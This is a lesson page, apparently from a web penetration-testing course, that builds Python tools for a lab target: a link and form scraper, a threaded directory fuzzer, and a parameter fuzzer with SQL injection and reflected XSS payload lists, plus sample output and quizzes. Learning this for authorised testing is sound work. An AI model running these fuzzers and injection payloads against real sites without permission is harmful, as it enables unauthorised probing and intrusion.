@@ -1,0 +1,237 @@
+---
+title: Web Scraper & Fuzzer in Python
+description: Build HTTP tools for web application reconnaissance and testing.
+---
+
+# Web Scraper & Fuzzer in Python
+
+Web scraping and fuzzing are core skills for web penetration testing. This lesson builds practical tools using Python's `requests` library.
+
+## Web Scraper — Extract Links & Forms
+
+```python
+#!/usr/bin/env python3
+import requests
+import re
+from urllib.parse import urljoin, urlparse
+
+def scrape_page(url, session=None):
+    """Extract all links and forms from a page."""
+    s = session or requests.Session()
+    s.headers["User-Agent"] = "Mozilla/5.0"
+
+    try:
+        r = s.get(url, timeout=5, verify=False)
+    except Exception as e:
+        return {"error": str(e)}
+
+    # Extract links
+    links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
+    links = [urljoin(url, l) for l in links]
+    links = [l for l in links if urlparse(l).netloc == urlparse(url).netloc]
+
+    # Extract forms
+    forms = []
+    form_blocks = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL)
+    for form in form_blocks:
+        action = re.search(r'action=["\']([^"\']*)["\']', form)
+        method = re.search(r'method=["\']([^"\']*)["\']', form)
+        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form)
+        forms.append({
+            "action": urljoin(url, action.group(1)) if action else url,
+            "method": method.group(1).upper() if method else "GET",
+            "inputs": inputs
+        })
+
+    return {
+        "url": url,
+        "status": r.status_code,
+        "links": list(set(links)),
+        "forms": forms,
+        "headers": dict(r.headers)
+    }
+
+# Usage
+result = scrape_page("http://10.10.10.5")
+print(f"Found {len(result['links'])} links")
+print(f"Found {len(result['forms'])} forms")
+for form in result['forms']:
+    print(f"  Form: {form['method']} {form['action']} — inputs: {form['inputs']}")
+```
+
+## Directory Fuzzer
+
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+import threading
+from queue import Queue
+
+def dir_fuzzer(target, wordlist, extensions=None, threads=30, timeout=5):
+    """Fuzz directories and files on a web server."""
+
+    # Load wordlist
+    with open(wordlist, "r", errors="ignore") as f:
+        words = [w.strip() for w in f if w.strip()]
+
+    # Build URL list
+    urls = []
+    for word in words:
+        urls.append(f"{target}/{word}")
+        if extensions:
+            for ext in extensions:
+                urls.append(f"{target}/{word}.{ext}")
+
+    found = []
+    queue = Queue()
+    for url in urls:
+        queue.put(url)
+
+    def worker():
+        session = requests.Session()
+        session.headers["User-Agent"] = "Mozilla/5.0"
+
+        while not queue.empty():
+            url = queue.get()
+            try:
+                r = session.get(url, timeout=timeout, allow_redirects=False, verify=False)
+                if r.status_code not in [404, 400]:
+                    result = f"[{r.status_code}] {url}"
+                    found.append(result)
+                    print(result)
+            except Exception:
+                pass
+            finally:
+                queue.task_done()
+
+    # Start threads
+    thread_list = []
+    for _ in range(threads):
+        t = threading.Thread(target=worker, daemon=True)
+        t.start()
+        thread_list.append(t)
+
+    queue.join()
+    return found
+
+# Usage
+dir_fuzzer(
+    target="http://10.10.10.5",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt",
+    extensions=["php", "html", "txt", "bak"],
+    threads=50
+)
+```
+
+## Parameter Fuzzer (SQLi/XSS Detection)
+
+```python
+#!/usr/bin/env python3
+import requests
+
+# Test payloads
+SQLI_PAYLOADS = [
+    "'",
+    "''",
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--",
+    "1' UNION SELECT NULL--",
+]
+
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(1)",
+    "'><script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+]
+
+SQL_ERRORS = [
+    "sql syntax", "mysql_fetch", "ora-", "syntax error",
+    "unclosed quotation", "quoted string not properly terminated",
+    "you have an error in your sql"
+]
+
+def test_sqli(url, param, value="1"):
+    """Test a URL parameter for SQL injection."""
+    session = requests.Session()
+    session.headers["User-Agent"] = "Mozilla/5.0"
+
+    # Get baseline response
+    baseline = session.get(url, params={param: value}, timeout=5)
+
+    for payload in SQLI_PAYLOADS:
+        try:
+            r = session.get(url, params={param: payload}, timeout=5)
+
+            # Check for SQL errors
+            for error in SQL_ERRORS:
+                if error in r.text.lower():
+                    print(f"[!] SQL ERROR detected with payload: {payload}")
+                    print(f"    Error: {error}")
+                    return True
+
+            # Check for boolean-based (different response length)
+            if abs(len(r.text) - len(baseline.text)) > 100:
+                print(f"[?] Response length changed with: {payload}")
+                print(f"    Baseline: {len(baseline.text)} | Payload: {len(r.text)}")
+
+        except Exception as e:
+            print(f"[-] Error: {e}")
+
+    return False
+
+def test_xss(url, param):
+    """Test a URL parameter for reflected XSS."""
+    session = requests.Session()
+
+    for payload in XSS_PAYLOADS:
+        try:
+            r = session.get(url, params={param: payload}, timeout=5)
+            if payload in r.text:
+                print(f"[!] REFLECTED XSS: payload appears unencoded in response")
+                print(f"    Payload: {payload}")
+                return True
+        except Exception:
+            pass
+
+    return False
+
+# Usage
+print("[*] Testing for SQL Injection...")
+test_sqli("http://10.10.10.5/search", "q")
+
+print("\n[*] Testing for XSS...")
+test_xss("http://10.10.10.5/search", "q")
+```
+
+<TerminalWindow
+  title="Parameter Fuzzer Output"
+  command="python3 param_fuzzer.py"
+  output="[*] Testing for SQL Injection...
+[!] SQL ERROR detected with payload: '
+    Error: sql syntax
+[?] Response length changed with: ' OR '1'='1
+    Baseline: 1247 | Payload: 8934
+
+[*] Testing for XSS...
+[!] REFLECTED XSS: payload appears unencoded in response
+    Payload: <script>alert(1)</script>"
+/>
+
+<Quiz
+  question="What HTTP status code indicates a page was NOT found (and should be filtered out in fuzzing)?"
+  answer="404"
+  hint="404 = Not Found. Filter these out to reduce noise in fuzzing results."
+/>
+
+<Quiz
+  question="What technique detects boolean-based SQL injection without seeing error messages?"
+  answer="Comparing response lengths between true and false conditions"
+  hint="If '1=1' returns a longer response than '1=2', the application is likely vulnerable."
+/>
